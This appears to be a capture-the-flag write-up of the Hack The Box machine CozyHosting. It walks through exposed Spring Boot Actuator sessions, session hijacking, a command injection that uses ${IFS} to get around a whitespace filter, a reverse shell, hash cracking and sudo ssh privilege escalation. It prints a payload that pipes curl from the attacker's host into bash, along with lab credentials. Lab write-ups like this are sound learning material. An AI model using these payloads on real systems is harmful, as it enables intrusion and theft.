---
title: HTB - CozyHosting
pin: true
layout: ""
author: [ Scott & Jolicious ]
math: true
date: 2024-03-05 
mermaid: true
icon: https://wolfcareers.com/wp-content/uploads/2023/01/1_cQGpZGkSuehv-YEXUweMQ-e1672674616339.webp
---

![alt text](/cozyhos/CozyHosting.png)

## Overview:
CozyHosting is an Linux Easy Machine that features a Spring Boot application. The Actuator endpoint has access to get mappings and sessions. A user's session cookie can be found by enumerating the endpoint, which grants authenticated access to the main dashboard. The program is susceptible to command injection, which can be used to take control of the remote computer and obtain a reverse shell. By counting the JAR files in the application, hardcoded login credentials are found and utilized to access the local database. Once the hashed password in the database has been cracked, it may be used to get onto the computer as the user Josh. SSH as root is permitted for the user, and this is used to fully escalate rights.


## Recon
---

### Nmap:

As always start with port scanning of cozyHosting using nmap:

```python
kali Easy/CozyHosting » sudo nmap -sC -sV 10.10.11.230  -oN nmap/initial
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-02 12:14 +0545
Nmap scan report for 10.10.11.230 (10.10.11.230)
Host is up (0.70s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE   VERSION
22/tcp   open  ssh       OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp   open  http      nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
4444/tcp open  krb524?
8000/tcp open  http-alt?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 144.19 seconds
```

The nmap result listed out the different ports i.e 80, 4444 and 8000.
 <br>
The TCP Port 80 didnot follow redirection. So adding `cozyhosting.htb` at /etc/hosts.

### HTTP 80 

![1](/cozyhos/1.png)

This site seems like to be web hosting. while navigating the website there is login page . Jump into their.

![alt text](/cozyhos/2.png)

There was nothing much interesting or any injections like Sql, etc in login page.

Fuzz the directories using Dirsearch.
![alt text](/cozyhos/3.png)

There is something identified or found the actuator directories. 

Search actuator in google.
![alt text](/cozyhos/4.png)

It is the `Spring Boot Actuator`. 

While continuously searching the Spring Boot Actuator there is the some documentation about mappings and seesions. 
- `mappings` endpoint which provides information about the application’s request mappings and 
- `sessions` endpoint which provides information about the application’s HTTP sessions that are managed by Spring Session.

Through we might find these fuzzing directories.

```bash
kali Easy/CozyHosting » cat reports/http_cozyhosting.htb/output.txt 
200     5KB  http://cozyhosting.htb/actuator/env
200     0B   http://cozyhosting.htb/actuator/;/prometheus
200    15B   http://cozyhosting.htb/actuator/health
200    10KB  http://cozyhosting.htb/actuator/mappings
200    98B   http://cozyhosting.htb/actuator/sessions
200   124KB  http://cozyhosting.htb/actuator/beans
401    97B   http://cozyhosting.htb/admin
```
## Foothold

Lets see `/actuator/mappings` 
![alt text](/cozyhos/5.png)

OR, 
```bash
kali Easy/CozyHosting »  curl http://cozyhosting.htb/actuator/mappings -X GET | jq .  
```
![alt text](/cozyhos/or2.png)

And see `/actuator/sessions` 
![alt text](/cozyhos/6.png)

OR,
```bash
kali Easy/CozyHosting » curl http://cozyhosting.htb/actuator/sessions -X GET | jq . 
```
![alt text](/cozyhos/or1.png)



There is jsessionid cookie with the session for kanderson to access the admin page. so it is `Session-Hiiacking` .

### Session Hijacking

While inspecting, go to cookie settings and replace the jsessionid with kanderson sessionid 

![alt text](/cozyhos/7.png)

When refreshing the page `/login` or `/admin` it goes to Admin Dashboard.

![alt text](/cozyhos/8.png)

Success !

### Host into Automatic Patching

Submitting the hostname as with localhost and Username as abc
![alt text](/cozyhos/AP.png)

it shows host key failed.

![alt text](/cozyhos/AP1.png)

The error  indicate that the service is attempting to connect to the specified host via SSH something like that:

```bash
ssh -i id_rsa username@hostname
```
It must be Command Injection

and we tried to run some command and got this errors as follows that the whitespaces aren't allowed.
![alt text](/cozyhos/18.png)


### Command Injection 

If it is Command Injection, the thing is that White spaces are not allowed in the username box. Lets search for whitespace box with spaces. 

![alt text](/cozyhos/9.png)

Found it says that so to bypass we can use ${IFS} as single space. which is a special shell variable that stands for
Internal Field Separator and defaults to a space  in shells like `Bash` and `sh` . It must be something like these testing in the username if it so.

```bash
abc;curl${IFS}+$IP;
```

Open a python server with 8000. When submitting the hostname as abc and username as ``;curl${IFS}10.10.16.14|bash;#``

![alt text](/cozyhos/11.png)

It hitted back to local host

![alt text](/cozyhos/12.png)

Lets first get a reverse shell whith creating sh file named `a.sh` and add:
![alt text](/cozyhos/10.png)

Hit a submit button with the payload that callback o our reverse shell handler. 
![alt text](/cozyhos/14.png)

Same using python server as well as listen a netcat with 9001. 

![alt text](/cozyhos/13.png)

Got shell `app@cozyhosting`. 

First stabilize the shell using `/usr/bin/script -qc /bin/bash /dev/null`. After that, there is jar file called ``cloudhosting-0.0.1.jar`` . 
![alt text](/cozyhos/15.png)

Download it to our local machine using python3 server from remote and wget.
![alt text](/cozyhos/16.png)

After we decrypt the jar file and run this command and get password
![alt text](/cozyhos/17.png)

Got the credentials i.e postgres:Vg&nvzAQ7XxR for postgres database of `app@cloudhosting` . 
login in postgres instance using these command:
```bash
psql -U postgres -h 127.0.0.1 -W -p 5432
```
We are able to access the postgres sql.
![alt text](/cozyhos/19.png)
We check the databases present in the DBMS.

![alt text](/cozyhos/20.png)
Cozyhosting is the database we need to enumerate. We use the following command to connect to the database cozyhosting.

```bash
\c cozyhosting
```
![alt text](/cozyhos/21.png)
There are 3 tables in the database cozyhosting. Looking at the names, it looks like the table that would be useful to us is users.
![alt text](/cozyhos/22.png)
There are two hash in the table users `admin` and `kanderson`.

![alt text](/cozyhos/23.png)

We save the hash in a file and run john in order to crack the hash. John is able to crack the hash and we get the password as `manchesterunited`.
![alt text](/cozyhos/25.png)
Login as another user that is `josh` and see the `sudo` privileges we have as the user. We can run `ssh` using `sudo`.
![alt text](/cozyhos/26.png)
GTFObins has some useful information in order to run commands using `ssh` .
![alt text](/cozyhos/27.png)
We run the command as seen in GTFObin and get root access in the machine.
![alt text](/cozyhos/28.png)
                
### THE END !

### REFERENCES:
1. https://unix.stackexchange.com/questions/351331/how-to-send-a-command-with-arguments-without-spaces
2. https://gtfobins.github.io/gtfobins/ssh/
   
